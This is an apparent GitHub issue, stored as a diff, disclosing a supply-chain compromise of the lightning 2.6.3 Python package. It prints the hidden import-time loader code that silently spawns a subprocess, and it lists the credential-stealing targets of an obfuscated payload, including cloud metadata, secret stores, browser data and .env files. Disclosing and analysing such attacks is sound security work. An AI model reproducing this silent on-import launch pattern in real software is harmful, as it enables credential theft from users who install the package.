@@ -1,0 +1,146 @@
+# recovered-from-issue: https://github.com/Lightning-AI/pytorch-lightning/issues/21689
+
+TITLE
+Possible supply chain attack on version 2.6.3
+
+BODY
+### Bug description
+
+### Summary
+
+`lightning==2.6.3` (published on PyPI as `py3-none-any` wheel) contains a hidden execution chain that silently downloads a JavaScript runtime (Bun) and executes an 11.4 MB heavily obfuscated JavaScript payload upon `import lightning`. This payload contains credential-stealing functionality targeting cloud providers, browsers, and environment files.
+
+### Reproduction
+
+```bash
+pip download lightning==2.6.3 --no-deps
+unzip lightning-2.6.3-py3-none-any.whl
+```
+
+Inspect the following files:
+- __init__.py
+- start.py
+- router_runtime.js
+
+### Execution chain
+
+**Step 1 — __init__.py** spawns a background subprocess on import:
+
+```python
+def _run_runtime() -> None:
+    _runtime_dir = os.path.join(os.path.dirname(__file__), "_runtime")
+    _start = os.path.join(_runtime_dir, "start.py")
+    if os.path.exists(_start):
+        subprocess.Popen(
+            [sys.executable, _start],
+            cwd=_runtime_dir,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+threading.Thread(target=_run_runtime, daemon=True).start()
+```
+
+This runs silently on every `import lightning` with no user opt-in and all output suppressed.
+
+**Step 2 — `_runtime/start.py`** downloads and installs Bun v1.3.13 from GitHub, then executes `router_runtime.js` with stdout/stderr directed to null.
+
+**Step 3 — `_runtime/router_runtime.js`** is an 11,448,921-byte obfuscated JavaScript file. String extraction reveals:
+
+| Indicator | Count | Purpose |
+|-----------|-------|---------|
+| `.env` references | 373 | Environment variable / dotenv file harvesting |
+| `child_process` | 14 | Arbitrary command execution |
+| `exec` | 52 | Command execution |
+| `spawn` | 2 | Process spawning |
+| `chrome` | 11 | Browser data access |
+| `firefox` | 10 | Browser data access |
+| `brave` | 5 | Browser data access |
+| `webhook` | 4 | Data exfiltration |
+
+Embedded URLs include:
+- `http://169.254.169.254` — AWS IMDS (IAM credential theft from EC2/ECS)
+- AWS STS, Secrets Manager, SSM endpoints
+- Azure AD / login.microsoftonline.com OAuth endpoints
+- `https://vault.azure.net/.default`
+- GCP OAuth, Secret Manager, Cloud KMS endpoints
+- GitHub API (`/user`, `/search/commits`)
+- npm registry
+
+### Verification
+
+The file ea7d8d0a5c19a700c2843ffb63553b9b74d1d211b42bb39d in the package root (MANIFEST.in) and the RECORD file both list these files with matching hashes, confirming they are part of the published wheel — not a local modification.
+
+```
+SHA256 of router_runtime.js: 5f5852b5f604369945118937b058e49064612ac69826e0adadca39a357dfb5b1
+SHA256 of start.py: 0oFdQlrgjMYn8dtpAJRCFl-LvGS36RV-L_nXqrAglNQ (base64, from RECORD)
+```
+
+### Impact
+
+Any user who ran `import lightning` with version 2.6.3 installed may have had the following exfiltrated:
+- AWS/GCP/Azure cloud credentials (including EC2 instance role credentials via IMDS)
+- `.env` files and environment variables containing API keys and secrets
+- Browser stored credentials and cookies (Chrome, Firefox, Brave)
+- GitHub tokens
+- Cloud secrets manager contents
+
+### Requested actions
+
+1. **Yank `lightning==2.6.3` from PyPI immediately**
+2. Investigate how the build/release pipeline was compromised
+3. Audit all other recent releases for similar payloads
+4. Issue a public security advisory (CVE)
+5. Notify users via PyPI advisory and project channels
+
+### Environment
+
+- Package: `lightning==2.6.3` (`py3-none-any` wheel)
+- Source: PyPI (`pip download lightning==2.6.3`)
+- Date verified: April 30, 2026
+
+
+### What version are you seeing the problem on?
+
+v2.6
+
+### Reproduced in studio
+
+_No response_
+
+### How to reproduce the bug
+
+```python
+
+```
+
+### Error messages and logs
+
+```
+# Error messages and logs here please
+```
+
+
+### Environment
+
+<details>
+  <summary>Current environment</summary>
+
+```
+#- PyTorch Lightning Version (e.g., 2.6.0):
+#- PyTorch Version (e.g., 2.5):
+#- Python version (e.g., 3.12):
+#- OS (e.g., Linux):
+#- CUDA/cuDNN version:
+#- GPU models and configuration:
+#- How you installed Lightning(`conda`, `pip`, source):
+```
+
+</details>
+
+
+### More info
+
+_No response_
+
+cc @ethanwharris
